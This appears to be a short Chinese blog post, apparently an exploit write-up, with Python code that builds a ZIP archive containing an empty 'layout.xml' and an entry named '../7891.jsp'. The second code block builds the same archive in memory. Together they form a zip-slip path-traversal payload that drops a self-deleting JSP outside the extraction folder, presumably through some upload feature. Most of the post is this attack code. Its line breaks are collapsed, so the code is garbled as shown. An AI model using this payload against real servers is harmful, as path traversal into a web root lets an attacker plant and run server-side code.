Zip压缩制作，在查看网上结构的时候，发现了不同，具体如下

所以用代码实现即可，会生成y.zip

import iodef write_zipFile(Filename,Content):
    with zipfile.ZipFile("y.zip", mode='a', compression=zipfile.ZIP_DEFLATED, ) as zf:        zf.writestr('layout.xml', "")        zf.writestr(Filename, Content)
Filename = "../7891.jsp"Content  = "<% out.println(new String(\"Hello\"));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"data = write_zipFile(Filename,Content)

如果想不想生成zip的话，直接使用如下代码

    def custom_build_zip(path,content):        zip_buffer = io.BytesIO()        with zipfile.ZipFile(zip_buffer, mode='a',compression=zipfile.ZIP_DEFLATED) as zf:            zf.writestr('layout.xml', "")            zf.writestr("../"+path, content)        return zip_buffer.getvalue()
